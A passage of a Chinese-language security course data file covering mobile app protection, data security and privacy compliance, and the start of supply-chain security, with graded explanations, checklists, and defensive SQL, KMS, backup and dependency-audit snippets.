          summary: "客户端加密的密钥也在客户端：能防「随便翻文件」，防不住有 Root/越狱的针对性攻击。",
          keywords: ["客户端加密","keystore","keychain","密钥保护","本地数据"],
          levels: {
            "入门": "把本地文件加密能挡住「捡到手机随便看」，但如果攻击者能 Root/越狱，密钥也可能被拿到。",
            "初级": "做法：密钥存系统密钥库（Android Keystore / iOS Keychain）、敏感数据加密落地、避免把密钥硬编码或与数据放一起。",
            "中级": "实战：验证密钥是否可被导出（可导出就等于没有保护）、是否随备份外泄、以及加密是否覆盖数据库与缓存。",
            "高级": "深入：理解硬件支持的安全区域（TEE/Secure Enclave）边界、以及「设备被完全控制」时的防御上界——关键校验仍需服务端。",
          },
          codeLang: "text",
          code:
`客户端加密检查
□ 密钥存在系统密钥库（非硬编码/非明文文件）
□ 密钥是否可被导出？可导出=保护失效
□ 数据库、缓存、日志是否都覆盖？
□ 备份导出是否包含明文敏感数据？
`,
          tool: "Keystore/Keychain、jadx、Frida",
          refs: "移动数据保护实践"
        },
        {
          id: "mob-obfuscate", name: "客户端混淆与代码保护", level: "中级",
          summary: "混淆提高逆向成本但不改变可被分析的事实；关键是别把安全逻辑放在客户端。",
          keywords: ["混淆","proguard","字符串加密","反调试","成本"],
          levels: {
            "入门": "混淆就是把代码改得难读（名字乱、逻辑绕）。它让逆向更费劲，但不是「不能逆向」。",
            "初级": "手段：标识符重命名、字符串加密、控制流混淆、反调试与完整性校验；常见工具如 ProGuard/R8、商业加固。",
            "中级": "实战：评估混淆强度的方式是「关键逻辑是否仍能被定位」；对硬编码密钥与本地校验，混淆只是延缓而非阻止。",
            "高级": "深入：混淆与反混淆是持续对抗；工程上应把有限预算投在「服务端校验 + 风控」上，客户端只做体验与成本提升。",
          },
          codeLang: "text",
          code:
`混淆的价值定位
能挡：随手改包者、简单脚本
挡不住：有经验的逆向者（定位关键函数只是时间问题）
结论：客户端只提高成本；安全判断必须在服务端
`,
          tool: "ProGuard/R8、加固平台、jadx",
          refs: "移动代码保护实践"
        },
        {
          id: "mob-store", name: "应用商店与上架安全", level: "初级",
          summary: "上架审核是外部约束也是质量关卡：权限声明、隐私政策与实际行为必须一致。",
          keywords: ["上架","审核","隐私政策","权限声明","合规"],
          levels: {
            "入门": "应用要上架商店得先过审核，审核会看你要了什么权限、隐私政策写了什么——写一套做一套会被下架。",
            "初级": "常见退回原因：权限与功能不匹配、隐私政策缺失或与实际采集不一致、涉及敏感权限未说明用途、SDK 违规采集。",
            "中级": "实战：上架前做「权限-功能-政策」三方核对，逐个第三方 SDK 核查采集行为；保留版本与政策变更记录以便追溯。",
            "高级": "深入：合规是持续过程（政策更新、SDK 变更、地区差异），要把上架检查纳入发版流程而不是临上线才补材料。",
          },
          codeLang: "text",
          code:
`上架前三方核对
权限声明  ↔ 实际功能 ↔ 隐私政策
· 每个敏感权限有对应功能与说明？
· 第三方 SDK 采集项是否写入政策？
· 政策版本与变更记录是否可追溯？
`,
          tool: "上架检查清单、SDK 清单",
          refs: "移动应用合规实践"
        },
      ]
    },
    /* ---------------- 数据安全与隐私 ---------------- */
    {
      id: "datasec", name: "数据安全与隐私", icon: "🔒",
      desc: "从分类分级、脱敏、加密与密钥、审计溯源到隐私合规与泄露处置，覆盖数据全生命周期的防护。",
      topics: [
        {
          id: "ds-lifecycle", name: "数据生命周期与分类分级", level: "入门",
          summary: "数据从采集到销毁要经历多个阶段，每个阶段的防护重点不同；先分级才知道该保护到什么程度。",
          keywords: ["数据安全","生命周期","分类分级","采集","存储","销毁"],
          levels: {
            "入门": "数据不是存下来就完事：它被收集、使用、分享、存档、最后销毁。每个环节都可能出事，所以要先知道「哪些数据重要」，再决定花多少力气保护。",
            "初级": "生命周期六阶段：采集—传输—存储—使用—共享—销毁。分级通常分四级（公开/内部/秘密/机密）。分级决定加密强度、审批流程与留存期限。",
            "中级": "实战落地：先做数据资产盘点（有哪些库表、谁能访问），再按业务影响定级，最后把控制措施绑到等级上（机密级必须加密+审批+审计）。分级错了，后面全错。",
            "高级": "深入：分级要可执行（能自动化识别与打标），并与权限、脱敏、DLP、审计联动；销毁要有可证明的流程（含备份与副本）。合规侧对应最小必要与留存期限要求。",
          },
          codeLang: "text",
          code:
`数据分级（示例）
L1 公开    ：官网文案、公开文档
L2 内部    ：内部制度、普通员工通讯录
L3 秘密    ：客户数据、源代码、合同
L4 机密    ：身份与生物特征、密钥、核心算法
控制要求：L3+ 加密存储、访问审批、操作审计；L4 另需脱敏展示与双人复核`,
          tool: "数据资产盘点表、DLP、分类分级平台",
          refs: "《数据安全法》《个人信息保护法》；DSMM"
        },
        {
          id: "ds-classify", name: "数据分类分级实操", level: "初级",
          summary: "分级不是贴标签了事：要能自动化识别敏感字段、可审计、可在权限与脱敏链路上真正生效。",
          keywords: ["分类","分级","敏感字段","打标","自动化识别","数据地图"],
          levels: {
            "入门": "给数据贴标签：这条是电话号码（敏感），那条是产品介绍（公开）。标签贴对了，系统才知道该怎么处理它。",
            "初级": "常见做法：按字段名与内容规则识别（手机号/身份证/银行卡的正则）、结合业务字典、建立数据地图。分级结果要能驱动权限与脱敏，而不是只写文档。",
            "中级": "实战：先抽样确认规则准确率与漏报（如备注字段里混入手机号），再接入审批与审计；对新增表要求「建表即定级」，否则半年后没人分得清。",
            "高级": "深入：跨库跨云的统一标识（数据血缘 + 标签传播）、以及分级与最小权限/脱敏/水印的联动闭环；难点在准确率与业务效率的平衡。",
          },
          codeLang: "sql",
          code:
`-- 用规则快速发现疑似敏感字段（抽样核查用）
SELECT table_name, column_name, COUNT(*) AS hits
FROM   information_schema.columns
WHERE  column_name ~* '(phone|mobile|id_card|email|bank)'
ORDER  BY table_name;`,
          tool: "数据地图、正则/ML 识别、元数据平台",
          refs: "《数据安全法》分级要求；DSMM 实践"
        },
        {
          id: "ds-dlp", name: "数据防泄漏 DLP", level: "中级",
          summary: "DLP 在出口处检测敏感数据外流，覆盖终端、网络与云端；难点是准确率与绕过对抗。",
          keywords: ["dlp","数据防泄漏","外发","水印","通道","误报"],
          levels: {
            "入门": "DLP 像门口的安检：有人要把敏感文件带走（邮件、U 盘、网盘），它会拦住并提醒。",
            "初级": "三个方向：终端 DLP（复制/打印/U 盘）、网络 DLP（邮件/HTTP/IM）、云端 DLP（SaaS 与对象存储）。识别方式：关键字、正则、指纹、文档指纹（文档相似度）。",
            "中级": "实战：先跑观察模式统计真实外发行为与误报，再逐步收紧；对研发/设计类岗位要留白名单与审批流，否则业务会绕过（改后缀、压缩加密、截图）。",
            "高级": "深入：DLP 与加密/水印/权限（IRM）配合才有意义；截图与拍照无法拦，需要水印溯源 + 审计威慑 + 制度约束的组合。",
          },
          codeLang: "text",
          code:
`DLP 上线三步（避免一上来就阻断）
1) 观察期：只记录不外发行为，统计敏感数据流向与误报
2) 收敛期：对确定的高风险通道（外发邮件含 L4）先告警 + 审批
3) 常态化：按岗位分策略，保留审批与申诉通道`,
          tool: "终端 DLP、邮件网关、CASB、水印工具",
          refs: "DLP 部署实践；数据防泄漏指南"
        },
        {
          id: "ds-mask", name: "脱敏与假名化", level: "初级",
          summary: "让开发、测试、分析人员看到「能干活但不是真数据」的数据；脱敏要不可逆或受控可逆。",
          keywords: ["脱敏","假名化","掩码","数据可用性","测试数据","重标识"],
          levels: {
            "入门": "把真数据换成假的：手机号中间四位打星、姓名换成「张*」。干活够用，泄露了也不怕。",
            "初级": "手段：掩码、替换、截断、泛化（年龄段）、置换、令牌化（token 保留格式）。静态脱敏用于测试库，动态脱敏用于生产查询展示。",
            "中级": "实战：注意「组合可重标识」——单独去掉姓名但仍留生日+邮编+性别，可能被重新识别；脱敏后要做重标识风险评估（k-匿名思路）。",
            "高级": "深入：令牌化与假名化的合规差异（假名化数据仍属个人信息）、密钥与映射表的隔离保管、以及分析场景下的差分隐私等更强技术。",
          },
          codeLang: "python",
          code:
`# 常见脱敏写法（示例）
def mask_phone(p): return p[:3] + "****" + p[-4:]
def mask_idcard(s): return s[:6] + "********" + s[-4:]

# 注意：掩码不等于匿名——保留生日/邮编等准标识符仍可能重标识`,
          tool: "脱敏网关、数据虚拟化、令牌化服务",
          refs: "个人信息安全规范；k-匿名/差分隐私"
        },
        {
          id: "ds-encrypt", name: "数据加密与密钥管理", level: "中级",
          summary: "加密解决「拿到文件也没用」，但密钥管理才是真正的难点：密钥泄露等于没加密。",
          keywords: ["加密","kms","密钥管理","轮换","信封加密","tde","密钥泄露"],
          levels: {
            "入门": "把数据锁进保险箱，钥匙单独保管。小偷拿到保险箱也打不开——除非他也拿到钥匙。",
            "初级": "三个层面：传输加密（TLS）、存储加密（磁盘/数据库 TDE）、字段级加密（只加密敏感列）。密钥要放 KMS，不能写死在代码或配置里。",
            "中级": "实战：信封加密（数据密钥加密数据、主密钥加密数据密钥）、定期轮换、按用途隔离密钥（不同环境不同密钥）、并用审计日志监控密钥调用异常。",
            "高级": "深入：密钥分层与信任根（HSM）、密钥销毁与合规留存、字段级加密带来的检索与排序难题（可选确定性加密但会泄露相等性）、以及多云密钥治理。",
          },
          codeLang: "bash",
          code:
`# 用 KMS 做信封加密（示意）
aws kms encrypt --key-id <key> --plaintext file://secret.txt --output text --query CiphertextBlob | base64 -d > secret.enc
# 解密时由 KMS 审计每一次调用；数据密钥与主密钥分离，减少泄露面`,
          tool: "KMS/HSM、TDE、Vault、字段级加密组件",
          refs: "云 KMS 文档；密钥管理实践"
        },
        {
          id: "ds-access", name: "数据访问控制与最小权限", level: "初级",
          summary: "数据泄露多数来自权限过大或长期有效的授权；按需授权、定期复核是核心动作。",
          keywords: ["访问控制","最小权限","rbac","abac","权限复核","临时授权"],
          levels: {
            "入门": "只给干活需要的权限：能用只读就不给写，能看三张表就不给整库。",
            "初级": "模型：RBAC（按角色）、ABAC（按属性）、行级/列级权限。生产库禁止共享账号，敏感操作走堡垒机与审批。",
            "中级": "实战：每季度做权限复核（谁还留着离职同事的权限？），分析实际访问日志回收「有权限但从不使用」的授权，推广临时授权（到期自动失效）。",
            "高级": "深入：数据权限要能表达数据维度（只允许看自己负责的客户），并与脱敏、审计、DLP 联动；同时要防「权限聚合」——零散权限相加等价于高权限。",
          },
          codeLang: "sql",
          code:
`-- 行级权限示例：只允许看到自己负责的数据
CREATE POLICY own_customers ON customers
  USING (owner_id = current_setting('app.user_id')::int);
ALTER TABLE customers ENABLE ROW LEVEL SECURITY;`,
          tool: "RBAC/ABAC 平台、堡垒机、权限复核工具",
          refs: "访问控制实践；最小权限原则"
        },
        {
          id: "ds-audit", name: "数据审计与溯源", level: "中级",
          summary: "审计回答「谁在什么时候动了哪些数据」；没有审计，泄露事件就无法定责也无法止损。",
          keywords: ["审计","日志","溯源","数据水印","行为基线","不可篡改"],
          levels: {
            "入门": "把「谁看过、谁下载过什么」记下来。出了事能查，平时也能吓住想乱来的人。",
            "初级": "要记的内容：账号、时间、来源 IP、对象（库表/文件）、动作（查询/导出/下载）、影响行数。日志本身要防篡改（只追加、集中存储）。",
            "中级": "实战：典型告警是「非常规时段大批量导出」「离职前集中下载」；用行为基线发现偏离，与导出审批记录比对。",
            "高级": "深入：日志的完整性与留存（WORM/不可变存储）、跨系统关联（数据库 + 堡垒机 + DLP）、以及水印用于外流后的溯源定责。",
          },
          codeLang: "sql",
          code:
`-- 审计线索：找出单日导出量异常的行为（示例）
SELECT user_name, DATE(ts) d, COUNT(*) cnt, SUM(rows_affected) rows_
FROM   audit_log
WHERE  action IN ('export','download')
GROUP  BY user_name, DATE(ts)
HAVING SUM(rows_affected) > 100000
ORDER  BY rows_ DESC;`,
          tool: "数据库审计、堡垒机、SIEM、WORM 存储",
          refs: "审计日志规范；不可篡改存储"
        },
        {
          id: "ds-privacy-law", name: "隐私合规基础（个保法/GDPR）", level: "入门",
          summary: "合规不是法律部门的事：告知同意、最小必要、单独同意、删除权都会直接落到系统设计上。",
          keywords: ["个人信息保护法","gdpr","告知同意","最小必要","单独同意","删除权"],
          levels: {
            "入门": "法律要求：收集用户信息要先说清用途并取得同意；不该收的别收；用户要删就得能删。",
            "初级": "核心概念：个人信息与敏感个人信息（生物特征、医疗、金融）、告知同意的有效性、单独同意场景（敏感信息、对外提供、公开）、以及用户权利（查询、更正、删除、撤回）。",
            "中级": "实战落地：把同意做成可配置、可追溯（谁在什么时候同意了哪一版条款）；设计删除与导出接口（DSAR 响应）；对外提供第三方要单独告知并留记录。",
            "高级": "深入：隐私影响评估（PIA/DPIA）在需求阶段介入、数据处理协议（DPA）、跨境传输机制（标准合同、认证），以及产品指标里的隐私度量（收集项收敛率）。",
          },
          codeLang: "text",
          code:
`上线前隐私自查（精简版）
□ 收集项是否逐项有用途与必要性说明？
□ 敏感信息是否单独同意、是否可撤回？
□ 是否提供查询/更正/删除/导出入口？
□ 对外提供是否单独告知并签 DPA？
□ 留存期限是否明确到期自动清理？`,
          tool: "隐私管理平台、同意管理（CMP）、DSAR 工单",
          refs: "《个人信息保护法》；GDPR 要点"
        },
        {
          id: "ds-minimize", name: "最小化收集与告知同意", level: "初级",
          summary: "少收、早删、说清用途；很多泄露事件的根因是「收了一堆根本用不到的数据」。",
          keywords: ["最小必要","告知同意","用途限制","留存期限","默认关闭"],
          levels: {
            "入门": "别贪心：不需要的字段一个都不要。收了就要担责任，删掉最安全。",
            "初级": "四原则：目的限定（只用于声明的用途）、最小必要（字段与期限都最小）、默认关闭（非必要不默认勾选）、可追溯（同意版本可查）。",
            "中级": "实战：审查注册与埋点字段，砍掉无用途采集；给每个字段标注用途与留存期，到期自动匿名化或清理；埋点避免采到输入框内容与剪贴板。",
            "高级": "深入：把最小化变成工程约束（新增字段需评审用途与期限，否则流水线不通过），并结合聚合统计替代明细采集。",
          },
          codeLang: "text",
          code:
`字段评审模板
字段：user_location_precise
用途：门店推荐（需精确到街道？）→ 改为城市级即可
留存：30 天
依据：最小必要；城市级已满足业务，降低敏感度`,
          tool: "字段评审表、埋点治理、留存策略引擎",
          refs: "个人信息最小必要原则"
        },
        {
          id: "ds-cross-border", name: "数据出境与跨境传输", level: "高级",
          summary: "数据出境受严格监管：需评估必要性、选择合规路径并留痕，否则可能面临处罚与业务中断。",
          keywords: ["数据出境","跨境","安全评估","标准合同","认证","本地化"],
          levels: {
            "入门": "数据出国要报备：把国内用户的数据传到境外服务器，属于受监管行为，不能随手做。",
            "初级": "合规路径通常包括：安全评估、标准合同备案、保护认证；同时要做出境数据清单与必要性论证，明确接收方与用途。",
            "中级": "实战：先做数据出境盘点（哪些系统、哪些字段、流向哪个国家/地区），再评估是否可本地化/去标识化替代；对必须出境的走对应路径并留存协议与记录。",
            "高级": "深入：敏感个人信息与重要数据的特殊要求、境外接收方再转移的限制、以及监管检查时的举证材料（清单、评估报告、合同、审计记录）。",
          },
          codeLang: "text",
          code:
`出境合规最小动作
1) 出清单：系统 / 字段 / 接收方 / 国家地区 / 用途 / 传输方式
2) 判路径：能否本地化 → 不能则选评估或标准合同或认证
3) 留证据：协议、评估报告、传输与访问日志`,
          tool: "数据出境清单、标准合同模板、合规评估工具",
          refs: "数据出境安全评估办法；标准合同规定"
        },
        {
          id: "ds-leak-response", name: "数据泄露应急与通报", level: "高级",
          summary: "泄露处置的关键是「先止血、再评估、按法定期限通报」，且全过程留证以便定责与复盘。",
          keywords: ["数据泄露","应急响应","通报","定责","影响评估","复盘"],
          levels: {
            "入门": "发现数据泄露，第一件事是关掉泄露通道和固定证据，然后评估影响、按规矩上报。",
            "初级": "动作顺序：确认与隔离（收回权限、封锁通道）→ 固定证据（日志、快照）→ 评估范围（哪些数据、多少人）→ 依法通报与告知用户 → 整改复盘。",
            "中级": "实战：评估要看数据等级与可识别性（是否可重标识），通报内容通常包含泄露数据类型、可能影响、已采取措施与用户建议；同时准备客服口径与咨询通道。",
            "高级": "深入：全流程留证（取证链完整性）、与监管/公安的沟通节奏、对外沟通的合规边界（避免二次泄露），以及把复盘结论落成控制项（权限收敛、脱敏上线、审计加强）。",
          },
          codeLang: "text",
          code:
`泄露处置时间线（模板）
T+0   发现并隔离通道 → 保留日志/快照
T+2h  初步范围判断（数据类型、量级、可能主体）
T+24h 完成影响评估，决定是否通报与告知
T+72h 完成通报与用户告知，启动整改
T+7d  复盘：根因、控制项、责任人、验证方式`,
          tool: "应急流程模板、取证工具、工单系统",
          refs: "数据安全事件应急预案；通报要求"
        },
        {
          id: "ds-insider", name: "内部威胁与权限滥用", level: "中级",
          summary: "内部人员熟悉系统与流程，绕过手段更隐蔽；防御靠权限收敛、行为基线与双人复核。",
          keywords: ["内部威胁","权限滥用","离职风险","行为基线","双人复核","最小权限"],
          levels: {
            "入门": "自己人最危险：知道数据在哪、怎么拿，也不容易被怀疑。",
            "初级": "高风险信号：非工作时段批量访问、离职前集中下载、越权查询他人负责的数据、拒绝休假（怕别人接手时暴露）。",
            "中级": "实战：靠行为基线发现异常（本人历史 + 同岗位横向对比），对高敏操作（导出 L4、批量查询）加审批与双人复核，并做离职流程清单（当天回收权限）。",
            "高级": "深入：技术手段只能降低概率，要配合制度（轮岗、强制休假、审计威慑）与文化；同时避免过度监控导致的合规与信任问题。",
          },
          codeLang: "sql",
          code:
`-- 与同岗位基线对比，找出访问量异常的人（示意）
WITH base AS (
  SELECT role, AVG(cnt) avg_cnt FROM daily_access GROUP BY role
)
SELECT a.user_name, a.cnt, b.avg_cnt
FROM   daily_access a JOIN base b ON a.role = b.role
WHERE  a.cnt > b.avg_cnt * 5;`,
          tool: "UEBA、审计平台、离职流程清单",
          refs: "内部威胁防护实践"
        },
        {
          id: "ds-backup", name: "备份与不可变存储", level: "高级",
          summary: "勒索与误删的最后防线；备份要隔离、不可变、可恢复，且恢复能力必须被真实验证。",
          keywords: ["备份","不可变","离线","3-2-1","恢复演练","勒索防护"],
          levels: {
            "入门": "备份就是多留一份。但如果备份和原数据在一起，被一锅端就没用了，所以要多地存放。",
            "初级": "3-2-1 原则：三份数据、两种介质、一份异地。备份账号与生产账号分离，备份网络与管理通道隔离。",
            "中级": "实战：至少一份不可变（WORM/对象锁）或离线备份；恢复演练要定期做并记录 RTO/RPO 实测值，否则只是「以为能恢复」。",
            "高级": "深入：备份系统的自身安全（凭据与权限是勒索的高价值目标）、加密备份的密钥保管、以及演练要覆盖「生产全毁」的最坏场景。",
          },
          codeLang: "bash",
          code:
`# 对象锁（不可变）示意：写入后在保留期内不可删除/覆盖
aws s3api put-object --bucket backup --key db/full.dump --body full.dump \
  --object-lock-mode COMPLIANCE --object-lock-retain-until-date 2027-01-01T00:00:00Z
# 关键：备份账号与生产账号分离，且备份权限不可被生产侧删除`,
          tool: "对象锁/WORM、备份软件、恢复演练记录",
          refs: "3-2-1 备份原则；勒索防护实践"
        },
        {
          id: "ds-pii", name: "什么是个人信息与敏感个人信息", level: "入门",
          summary: "能识别到你个人的信息都是个人信息；其中一旦泄露危害更大的（生物特征、金融、医疗）属敏感信息。",
          keywords: ["个人信息","敏感个人信息","可识别","生物特征","合规"],
          levels: {
            "入门": "能直接或间接指向你的信息（姓名+电话、身份证号、定位轨迹）就是个人信息。像指纹、人脸、医疗记录这类，一旦泄露危害更大，属于敏感个人信息。",
            "初级": "判断要点：可识别性（能否对应到具体个人）与危害程度。敏感信息通常需要单独同意、更严格加密与更短留存。",
            "中级": "实战：做数据盘点时不要只看字段名（备注、附件、日志里也可能有个人信息）；注意「准标识符组合」——生日+性别+邮编也可能锁定一个人。",
            "高级": "深入：匿名化与假名化的边界、以及不同法域对敏感信息的定义差异（生物特征、位置、未成年人信息常被特别保护）。",
          },
          codeLang: "text",
          code:
`判断示例
姓名+手机号        → 个人信息
身份证号/人脸/指纹 → 敏感个人信息
「某公司员工平均年龄」 → 通常不是个人信息
「生日+性别+邮编」  → 准标识符组合，可能仍可识别`,
          tool: "数据盘点表、隐私合规清单",
          refs: "《个人信息保护法》；GDPR"
        },
        {
          id: "ds-leak-scene", name: "常见数据泄露场景", level: "入门",
          summary: "泄露很少来自「被高手攻破」，更多来自配置错误、权限过大与随手外发。",
          keywords: ["数据泄露","场景","配置错误","权限","外发","导出"],
          levels: {
            "入门": "现实中大部分泄露不是被攻破，而是自己「放出去了」：存储桶设成公开、权限给太大、文件随手发到外部网盘。",
            "初级": "高频场景：存储/数据库暴露在公网、共享链接无口令、离职人员权限未回收、测试环境用真实数据、日志与截图里带敏感信息。",
            "中级": "实战排查顺序：先把「对公网暴露的资产」扫一遍（这不等于渗透测试，是配置核查），再查权限与共享链接，然后看导出与外发记录。",
            "高级": "深入：这类问题的根因是「默认宽松 + 无人负责」，所以治理要落到配置基线、自动巡检与责任到人，而不是事后补救。",
          },
          codeLang: "text",
          code:
`自查清单（高收益）
□ 对象存储桶/数据库是否有公网暴露？
□ 共享链接是否带口令与有效期？
□ 离职与转岗人员的权限是否回收？
□ 测试/演示环境是否使用真实数据？
□ 日志、工单、截图中是否有个人信息？`,
          tool: "配置巡检、DLP、权限复核",
          refs: "数据泄露案例与防护"
        },
        {
          id: "ds-gateway", name: "数据网关与统一出口", level: "中级",
          summary: "把数据库访问与数据导出收敛到统一入口，才能做权限、脱敏与审计；散落直连等于没有管控。",
          keywords: ["数据网关","统一出口","代理","脱敏","审计","收敛"],
          levels: {
            "入门": "如果每个应用都直接连数据库，就没人能统一管住「谁看了什么」。数据网关就是那个统一入口。",
            "初级": "网关能做的事：统一鉴权、按规则脱敏（不同角色看到不同字段）、限流、以及把访问记入审计。",
            "中级": "实战：先把高敏库的直连收敛到网关（应用改造是难点），再逐步加脱敏与审批；导出类操作必须走网关并留痕。",
            "高级": "深入：网关要处理性能与单点风险（高可用、旁路只读副本）、并支持动态脱敏与敏感字段自动识别，否则规则维护不可持续。",
          },
          codeLang: "text",
          code:
`数据网关能落地的四件事
1) 统一鉴权：应用不再各自持有库口令
2) 动态脱敏：按角色返回不同字段（如身份证打码）
3) 审计：谁在何时查了哪些表、影响多少行
4) 限流与审批：大额导出走审批，异常查询被拦`,
          tool: "数据库代理/网关、脱敏引擎",
          refs: "数据访问治理实践"
        },
        {
          id: "ds-tokenize", name: "令牌化与字段级保护", level: "高级",
          summary: "把敏感值换成无意义令牌：业务照常用，泄露了也拿不到真实数据。",
          keywords: ["令牌化","字段级加密","卡号","脱敏","映射表"],
          levels: {
            "入门": "令牌化就是把敏感值（如卡号）换成另一串编号，真实值单独保管。系统里流转的都是编号，泄露也没用。",
            "初级": "与脱敏的区别：脱敏通常不可逆（只用于展示），令牌化可逆且保留部分格式（便于业务使用），映射关系需要严格保管。",
            "中级": "实战：适用场景是支付卡、身份证等高敏且需要「原值可查」的地方；令牌映射表要单独加密存储、访问需授权并审计。",
            "高级": "深入：注意令牌生成的不可预测性、映射表的单点风险（高可用 + 最小访问）、以及跨系统一致性问题（多系统令牌不统一会造成混乱）。",
          },
          codeLang: "text",
          code:
`令牌化设计要点
· 令牌随机不可预测（不能由原值推导）
· 保留必要格式（如后四位）以便业务使用
· 映射表独立加密存储 + 访问审批 + 审计
· 明确「谁能解令牌」的范围与流程`,
          tool: "令牌化服务、HSM/加密机",
          refs: "字段级保护实践"
        },
        {
          id: "ds-datamap", name: "数据资产地图与血缘", level: "中级",
          summary: "不知道数据在哪、流向哪，就谈不上保护；地图与血缘是所有数据安全工作的前提。",
          keywords: ["数据地图","血缘","资产盘点","流向","责任"],
          levels: {
            "入门": "先搞清楚「数据都在哪」：哪些库、哪些表、哪些文件、谁在用。没有这张地图，后面全是盲人摸象。",
            "初级": "地图要素：数据位置、字段含义、等级、责任人、访问者；血缘要素：从哪来、经哪些加工、流向哪。",
            "中级": "实战：先覆盖核心业务链路（注册→交易→报表），把「数据从哪来、到哪去」画出来；变更（新建表、导出）要同步更新地图。",
            "高级": "深入：自动化采集血缘（解析 SQL 与任务依赖）比人工维护可靠；血缘价值在于「出事时能快速圈定影响范围」。",
          },
          codeLang: "text",
          code:
`数据地图最小可用版
表/文件 → 字段与含义 → 等级 → 责任人 → 访问者
血缘：来源系统 → 加工任务 → 目标（库表/报表/导出）
价值：出事时 1 小时内圈定「哪些数据、哪些下游受影响」
`,
          tool: "元数据平台、血缘解析、数据资产目录",
          refs: "数据治理实践"
        },
        {
          id: "ds-sharing", name: "数据对外共享与接口开放", level: "中级",
          summary: "对外提供数据是高风险动作：要最小化字段、约束用途、可追溯调用，并留撤回能力。",
          keywords: ["数据共享","对外提供","接口","最小字段","撤回"],
          levels: {
            "入门": "把数据给合作方是常见需求，但给出去就收不回——所以要少给、写清用途、留记录。",
            "初级": "原则：最小字段（能聚合就不给明细）、用途限定（书面）、单独同意（涉及个人信息）、可追溯（谁在何时调了什么）。",
            "中级": "实战：接口要鉴权、限流、字段白名单；对批量导出加审批与审计；约定终止后的数据交还与销毁证明。",
            "高级": "深入：评估「组合风险」——对方把你这批数据与他方数据结合后可能产生新的识别能力，因此要给最必要的部分并考虑脱敏。",
          },
          codeLang: "text",
          code:
`对外共享检查
· 字段是否最小（明细/聚合）？
· 是否有单独同意与书面用途约定？
· 接口是否鉴权+限流+字段白名单？
· 是否约定终止后交还/销毁并留证明？
`,
          tool: "接口网关、审批流、审计日志",
          refs: "数据共享合规实践"
        },
        {
          id: "ds-ai-data", name: "AI 训练数据合规", level: "高级",
          summary: "训练数据来源与用途都要合规：来源合法性、授权范围、以及在模型里的残留风险。",
          keywords: ["训练数据","合规","授权","残留","删除"],
          levels: {
            "入门": "用数据训练 AI 之前，要先确认这些数据「能不能这么用」——来源正当、授权覆盖、且用户同意过。",
            "初级": "关注点：数据来源是否合法取得、原始授权是否覆盖训练用途、是否含个人信息或敏感信息、是否可响应删除请求。",
            "中级": "实战：优先使用脱敏/合成数据；对必须使用真实数据的场景做影响评估并记录依据；建立数据来源台账便于追溯。",
            "高级": "深入：模型可能记住训练数据（记忆/泄露风险），而「从模型中删除某条数据」在技术上极难——因此源头把关比事后删除更现实。",
          },
          codeLang: "text",
          code:
`训练数据合规清单
□ 来源是否合法（爬取/购买/自有）？
□ 原授权是否覆盖「训练模型」用途？
□ 是否含个人信息？能否脱敏或合成替代？
□ 能否响应数据主体的删除请求？（技术上极难 → 源头把关）
`,
          tool: "数据台账、脱敏工具、影响评估模板",
          refs: "AI 数据合规实践"
        },
      ]
    },
    /* ---------------- 供应链安全 ---------------- */
    {
      id: "supply", name: "供应链安全", icon: "🔗",
      desc: "覆盖依赖治理、SBOM 与 SCA、投毒防护、构建链与制品签名、CI/CD 与供应商风险，以及供应链事件响应。",
      topics: [
        {
          id: "sc-concept", name: "软件供应链风险全景", level: "入门",
          summary: "你写的代码只占系统一小部分，其余来自开源依赖、构建工具与第三方服务——攻击面也在这里。",
          keywords: ["供应链","开源依赖","第三方","构建","投毒","风险全景"],
          levels: {
            "入门": "做一道菜，食材、调料、厨具都是别人提供的。任何一环被动手脚，最后端上桌的菜就有问题。软件也一样。",
            "初级": "风险面：开源依赖漏洞、依赖投毒（仿冒包）、构建环境被入侵、制品被替换、第三方服务与外包、以及更新通道被劫持。",
            "中级": "实战评估顺序：先摸清依赖清单与版本（含传递依赖），再看构建与发布链路的权限与审计，最后看第三方接入与数据流向。",
            "高级": "深入：把供应链风险落到可控项——依赖治理策略、构建可复现、制品签名、最小权限的发布通道，以及应急预案（如何快速判定「我是否受影响」）。",
          },
          codeLang: "text",
          code:
`供应链自检清单（速览）
□ 是否知道线上制品由哪些依赖与版本构成？（SBOM）
□ 依赖漏洞如何发现、多久响应一次？
□ 构建机与发布凭证的权限是否最小、是否审计？
□ 制品是否签名并验证？更新通道是否可被劫持？
□ 出事时能否在 1 小时内判定影响范围？`,
          tool: "SBOM 工具、SCA、制品仓库、签名方案",
          refs: "SLSA；NIST SSDF；供应链安全实践"
        },
        {
          id: "sc-sbom", name: "SBOM 软件物料清单", level: "初级",
          summary: "SBOM 是「这个软件由什么组成」的清单；没有它，出现新漏洞时无法快速判断自己是否受影响。",
          keywords: ["sbom","spdx","cyclonedx","物料清单","依赖清单","可追溯"],
          levels: {
            "入门": "就像食品配料表：写清这个软件里都有哪些组件和版本。出了问题能第一时间查有没有中招。",
            "初级": "两类格式：SPDX 与 CycloneDX；内容要含组件名、版本、供应者、依赖关系。生成方式：CI 里用工具自动产出并随制品归档。",
            "中级": "实战：SBOM 要与制品绑定（同一构建产物、可校验），并接入漏洞库做持续比对；注意传递依赖与构建工具本身也要纳入。",
            "高级": "深入：SBOM 的可信性依赖构建环境可信（否则清单也可能造假），需与可复现构建、制品签名组合，才能形成可验证的证据链。",
          },
          codeLang: "bash",
          code:
`# 生成 SBOM（示意，常见工具）
syft dir:. -o cyclonedx-json > sbom.cdx.json     # 目录/镜像扫描
grype sbom:sbom.cdx.json                          # 基于 SBOM 查漏洞
# 关键：SBOM 与制品一起归档并绑定校验值`,
          tool: "syft、grype、cdxgen、Dependency-Track",
          refs: "SPDX / CycloneDX 规范"
        },
        {
          id: "sc-dependency", name: "依赖漏洞管理", level: "初级",
          summary: "依赖漏洞是常态，关键在「发现得快 + 响应有优先级 + 修得动」；单纯堆扫描器没用。",
          keywords: ["依赖漏洞","cve","升级","响应时限","优先级","传递依赖"],
          levels: {
            "入门": "用的开源组件被发现有漏洞时，要尽快升级到修好的版本。难点是组件太多、升一个可能牵连一片。",
            "初级": "做法：锁定版本（lockfile）+ 定期扫描 + 按可利用性排序（是否可达、是否有 EXP、是否暴露在公网）；区分「直接依赖」与「传递依赖」。",
            "中级": "实战：建立响应 SLA（高危 7 天、严重 24 小时），准备升级与临时缓解（WAF 规则、关闭功能）两条路；对无法升级的老组件做隔离与补偿控制。",
            "高级": "深入：依赖治理要前移到引入环节（新增依赖需评审、限制来源与许可证），并用可达性分析降低噪音，避免「告警千条、无人处理」。",
          },
          codeLang: "bash",
          code:
`# 常见生态的依赖审计入口
npm audit --production
pip-audit -r requirements.txt
